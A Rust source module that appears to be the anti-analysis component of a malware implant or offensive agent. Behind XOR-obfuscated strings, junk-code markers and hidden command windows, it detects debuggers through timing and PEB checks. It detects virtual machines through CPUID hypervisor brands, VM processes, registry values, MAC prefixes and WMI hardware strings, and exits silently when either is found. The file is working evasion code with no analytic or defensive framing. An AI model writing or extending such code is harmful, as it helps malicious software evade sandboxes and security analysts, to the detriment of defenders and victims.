use crate::sprotect;
use std::process;
#[cfg(target_arch = "x86_64")]
use std::arch::x86_64::{__cpuid, __cpuid_count, _rdtsc, _mm_lfence};
#[cfg(target_arch = "x86")]
use std::arch::x86::{__cpuid, __cpuid_count, _rdtsc, _mm_lfence};
use std::hint::black_box;
use rand::Rng;

//#junk(name="det_junk1")
//#endjunk()

//#junk(name="det_junk2")
//#endjunk()

fn xor_decrypt(data: &[u8], key: u8) -> String {
    data.iter().map(|&b| ((b ^ key) as char)).collect()
}

fn get_runtime_key() -> u8 {
    let mut rng = rand::thread_rng();
    rng.gen_range(1..=255)
}

pub fn timing_check() -> bool {
    unsafe {
        let key = get_runtime_key();
        //#jcall(name="det_junk1")
        let threshold = 800 + (key as u64 * 3);

        _mm_lfence();
        let start = _rdtsc();

        for _ in 0..10 {
            black_box(key.wrapping_mul(7).wrapping_add(13));
        }
        //#jcall(name="det_junk2")

        _mm_lfence();
        let end = _rdtsc();
        let cycles = end.wrapping_sub(start);

        cycles > threshold
    }
}

#[cfg(target_os = "windows")]
pub fn peb_check() -> bool {
    use crate::api_resolve::HashedAPIs;

    unsafe {
        HashedAPIs::is_debugger_present() != 0
    }
}

#[cfg(not(target_os = "windows"))]
pub fn peb_check() -> bool {
    false
}

pub fn cpuid_vm_check() -> bool {
    unsafe {
        //#jcall(name="det_junk1")
        
        let key = get_runtime_key();

        let cpuid1 = __cpuid(1);
        
        //#jcall(name="det_junk2")
        
        // Check ECX bit 31 - Hypervisor Present bit (CORRECT method)
        // This is the standard CPUID hypervisor detection
        if (cpuid1.ecx & (1 << 31)) != 0 {
            // Hypervisor bit is set - now verify it's a real VM by checking brand
            let cpuid_hv = __cpuid_count(0x40000000, 0);
        let brand_bytes = [
            ((cpuid_hv.ebx >> 0) & 0xFF) as u8,
            ((cpuid_hv.ebx >> 8) & 0xFF) as u8,
            ((cpuid_hv.ebx >> 16) & 0xFF) as u8,
            ((cpuid_hv.ebx >> 24) & 0xFF) as u8,
            ((cpuid_hv.ecx >> 0) & 0xFF) as u8,
            ((cpuid_hv.ecx >> 8) & 0xFF) as u8,
            ((cpuid_hv.ecx >> 16) & 0xFF) as u8,
            ((cpuid_hv.ecx >> 24) & 0xFF) as u8,
            ((cpuid_hv.edx >> 0) & 0xFF) as u8,
            ((cpuid_hv.edx >> 8) & 0xFF) as u8,
            ((cpuid_hv.edx >> 16) & 0xFF) as u8,
            ((cpuid_hv.edx >> 24) & 0xFF) as u8,
        ];

        let brand = String::from_utf8_lossy(&brand_bytes).to_uppercase();

        let vmware_enc = [86^key, 77^key, 119^key, 97^key, 114^key, 101^key];
        let kvm_enc = [75^key, 86^key, 77^key];
        let vbox_enc = [86^key, 98^key, 111^key, 120^key];
        let hyperv_enc = [77^key, 105^key, 99^key, 114^key, 111^key, 115^key, 102^key, 116^key, 32^key, 72^key, 118^key];
        let qemu_enc = [81^key, 69^key, 77^key, 85^key];
        let xen_enc = [88^key, 101^key, 110^key, 86^key, 77^key, 77^key];

        let vmware_str = xor_decrypt(&vmware_enc, key);
        let kvm_str = xor_decrypt(&kvm_enc, key);
        let vbox_str = xor_decrypt(&vbox_enc, key);
        let hyperv_str = xor_decrypt(&hyperv_enc, key);
        let qemu_str = xor_decrypt(&qemu_enc, key);
        let xen_str = xor_decrypt(&xen_enc, key);

            // Check if it's a known VM brand
            return brand.contains(&vmware_str.to_uppercase()) ||
                   brand.contains(&kvm_str.to_uppercase()) ||
                   brand.contains(&vbox_str.to_uppercase()) ||
                   brand.contains(&hyperv_str.to_uppercase()) ||
                   brand.contains(&qemu_str.to_uppercase()) ||
                   brand.contains(&xen_str.to_uppercase());
        }
        
        // Hypervisor bit not set - running on real hardware
        false
    }
}

pub fn process_vm_check() -> bool {
    use std::process::Command;

    let key = get_runtime_key();

    let vm_procs_enc = vec![
        vec![118^key, 109^key, 116^key, 111^key, 111^key, 108^key, 115^key, 100^key],
        vec![118^key, 109^key, 119^key, 97^key, 114^key, 101^key, 116^key, 111^key, 111^key, 108^key, 115^key, 100^key],
        vec![118^key, 98^key, 111^key, 120^key, 115^key, 101^key, 114^key, 118^key, 105^key, 99^key, 101^key],
        vec![118^key, 98^key, 111^key, 120^key, 116^key, 114^key, 97^key, 121^key],
        vec![120^key, 101^key, 110^key, 115^key, 101^key, 114^key, 118^key, 105^key, 99^key, 101^key],
        vec![113^key, 101^key, 109^key, 117^key, 45^key, 103^key, 97^key],
        vec![118^key, 109^key, 109^key, 115^key],
        vec![118^key, 109^key, 99^key, 111^key, 109^key, 112^key, 117^key, 116^key, 101^key],
        vec![112^key, 114^key, 108^key, 95^key, 116^key, 111^key, 111^key, 108^key, 115^key],
        vec![118^key, 103^key, 97^key, 117^key, 116^key, 104^key, 115^key, 101^key, 114^key, 118^key, 105^key, 99^key, 101^key],
    ];

    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x08000000;
        
        if let Ok(output) = Command::new(sprotect!("wmic"))
            .args([sprotect!("process"), sprotect!("get"), sprotect!("name,commandline")])
            .creation_flags(CREATE_NO_WINDOW)
            .output() {
            let processes = String::from_utf8_lossy(&output.stdout).to_lowercase();

            for proc_enc in &vm_procs_enc {
                let proc_name = xor_decrypt(&proc_enc, key).to_lowercase();
                if processes.contains(&proc_name) {
                    return true;
                }
            }

            if processes.contains(&sprotect!("vmtoolsd")) && processes.contains(&sprotect!("-n vmusr")) {
                return true;
            }
        }
    }

    #[cfg(target_os = "linux")]
    {
        if let Ok(output) = Command::new(sprotect!("ps")).arg(sprotect!("aux")).output() {
            let processes = String::from_utf8_lossy(&output.stdout).to_lowercase();

            for proc_enc in &vm_procs_enc {
                let proc_name = xor_decrypt(&proc_enc, key).to_lowercase();
                if processes.contains(&proc_name) {
                    return true;
                }
            }
        }
    }

    false
}

#[cfg(target_os = "windows")]
pub fn registry_vm_check() -> bool {
    use winreg::enums::*;
    use winreg::RegKey;

    let key = get_runtime_key();
    let vm_keys_enc = vec![
        vec![72^key, 65^key, 82^key, 68^key, 87^key, 65^key, 82^key, 69^key],
        vec![83^key, 89^key, 83^key, 84^key, 69^key, 77^key],
    ];

    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);

    for key_enc in &vm_keys_enc {
        let key_path = xor_decrypt(&key_enc, key);
        if let Ok(subkey) = hklm.open_subkey(&key_path) {
            for value in subkey.enum_values() {
                if let Ok((name, _)) = value {
                    let name_lower: String = name.to_lowercase();
                    if name_lower.contains(&sprotect!("vmware")) ||
                       name_lower.contains(&sprotect!("vbox")) ||
                       name_lower.contains(&sprotect!("virtual")) {
                        return true;
                    }
                }
            }
        }
    }

    false
}

#[cfg(not(target_os = "windows"))]
pub fn registry_vm_check() -> bool {
    false
}

pub fn mac_vm_check() -> bool {
    #[cfg(target_os = "windows")]
    {
        use std::process::Command;
        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x08000000;

        if let Ok(output) = Command::new(sprotect!("getmac"))
            .creation_flags(CREATE_NO_WINDOW)
            .output() {
            let mac_output = String::from_utf8_lossy(&output.stdout);
            let key = get_runtime_key();

            let vm_macs_enc = vec![
                vec![48^key, 48^key, 58^key, 48^key, 53^key, 58^key, 54^key, 57^key],
                vec![48^key, 48^key, 58^key, 48^key, 67^key, 58^key, 50^key, 57^key],
                vec![48^key, 48^key, 58^key, 49^key, 67^key, 58^key, 49^key, 52^key],
                vec![48^key, 48^key, 58^key, 53^key, 48^key, 58^key, 53^key, 54^key],
                vec![48^key, 56^key, 58^key, 48^key, 48^key, 58^key, 50^key, 55^key],
            ];

            for mac_enc in &vm_macs_enc {
                let vm_mac = xor_decrypt(&mac_enc, key);
                if mac_output.contains(&vm_mac) {
                    return true;
                }
            }
        }
    }

    false
}

pub fn wmi_hardware_check() -> bool {
    #[cfg(target_os = "windows")]
    {
        use std::process::Command;

        let wmi_queries = vec![
            (sprotect!("bios"), sprotect!("get"), sprotect!("manufacturer")),
            (sprotect!("computersystem"), sprotect!("get"), sprotect!("model")),
            (sprotect!("diskdrive"), sprotect!("get"), sprotect!("model")),
        ];

        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x08000000;

        for (class, cmd, prop) in wmi_queries {
            if let Ok(output) = Command::new(sprotect!("wmic"))
                .arg(class)
                .arg(cmd)
                .arg(prop)
                .creation_flags(CREATE_NO_WINDOW)
                .output() 
            {
                let wmi_output = String::from_utf8_lossy(&output.stdout).to_lowercase();

                let vm_indicators = vec![
                    sprotect!("vmware"),
                    sprotect!("virtualbox"),
                    sprotect!("vbox"),
                    sprotect!("qemu"),
                    sprotect!("virtual"),
                    sprotect!("innotek"),
                    sprotect!("parallels"),
                    sprotect!("xen"),
                    sprotect!("microsoft corporation virtual"),
                ];

                for indicator in vm_indicators {
                    if wmi_output.contains(&indicator.to_lowercase()) {
                        return true;
                    }
                }
            }
        }
    }

    false
}

pub fn comprehensive_vm_check() -> bool {
    // Multi-layered detection with CPUID as primary check
    // All checks enabled for maximum VM detection coverage
    cpuid_vm_check() || process_vm_check() || registry_vm_check() || mac_vm_check() || wmi_hardware_check()
}

pub fn comprehensive_debug_check() -> bool {
    timing_check() || peb_check()
}

pub fn demon_protection_check() -> bool {
    //#jcall(name="det_junk1")
    
    if comprehensive_debug_check() {
        return true;
    }

    //#jcall(name="det_junk2")

    if comprehensive_vm_check() {
        return true;
    }

    false
}

pub fn exit_if_detected() {
    //#jcall(name="det_junk1")
    
    if demon_protection_check() {
        process::exit(0);
    }
}